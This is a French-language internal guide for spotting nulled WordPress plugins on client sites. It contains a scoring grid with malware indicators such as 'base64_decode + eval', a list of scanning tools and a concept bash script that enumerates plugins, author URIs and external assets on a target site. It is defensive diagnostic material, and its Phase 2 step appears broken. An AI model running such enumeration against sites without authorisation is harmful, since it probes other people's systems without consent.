## Grille de Scoring pour le Rapport Client

| Critère | Points | Détection |
|---------|--------|-----------|
| Plugin premium sans licence | 30 pts | Fichier de licence absent ou falsifié |
| Version mismatch (readme.txt vs code) | 20 pts | Différence de version |
| Auteur modifié vers source nullée | 30 pts | Author URI = gplfreak.com ou similaire |
| Code obfusqué présent | 40 pts | base64_decode + eval |
| Core WP modifié | 50 pts | Checksum mismatch |
| Cron malveillant identifié | 35 pts | Hook cron suspect |
| Asset externe inconnu | 25 pts | JS/CSS depuis domaine inconnu |
| Plugin fermé sur WP.org | 30 pts | API retourne "closed":true |
| Sous-total | **Critique si >50** | **Urgent si >100** |

---

## Pour Aller Plus Loin

### Outils
- **WPScan** : `wpscan --url https://cible.com --enumerate p` (lister les plugins)
- **WhatWaf** : Détection WAF
- **curl + jq** : Analyse API WP.org
- **grep -r** : Recherche dans les fichiers exposés
- **custom bash scripts** : Automatisation de la détection
- **Puppeteer/Playwright** : Analyse des appels réseau en conditions réelles

### Liens utiles
- [WordPress Plugin API](https://api.wordpress.org/plugins/info/1.0/)
- [WordPress Core Checksums API](https://api.wordpress.org/core/checksums/1.0/)
- [WPScan Vulnerability Database](https://wpscan.com/)
- [Patchstack Database](https://patchstack.com/database/)
- [Wordfence Threat Intelligence](https://www.wordfence.com/threat-intel/)

### Script bash d'automatisation (concept)

```bash
#!/bin/bash
# audit_nulled.sh - Détection rapide de plugins nullés
# Usage: ./audit_nulled.sh https://cible.com

URL="$1"
WP_URL="${URL%/}"

echo "=== Phase 1: Plugins list ==="
for plugin in elementor-pro revslider gravityforms wp-rocket advanced-custom-fields-pro; do
  README=$(curl -s -o /dev/null -w "%{http_code}" "$WP_URL/wp-content/plugins/$plugin/readme.txt")
  if [ "$README" = "200" ]; then
    echo "[FOUND] $plugin"
    curl -s "$WP_URL/wp-content/plugins/$plugin/readme.txt" | grep -i "Stable tag:" | head -1
  fi
done

echo ""
echo "=== Phase 2: Author URI check ==="
# Vérifier les Author URI des plugins/thèmes
curl -s "$WP_URL/wp-content/themes/*/style.css" 2>/dev/null | grep -i "Author URI:" || echo "No themes accessible"

echo ""
echo "=== Phase 3: External assets ==="
curl -s "$WP_URL" | grep -oE "(src|href)=[\"'](https?://[^\"']+)" | grep -vE "(googleapis|gravatar|gstatic|jquery|cloudflare|jsdelivr)"
```

---

> **Version** : 1.0  
> **Dernière mise à jour** : 2026-07-16  
> **Classification** : Usage interne, outil de diagnostic commercial
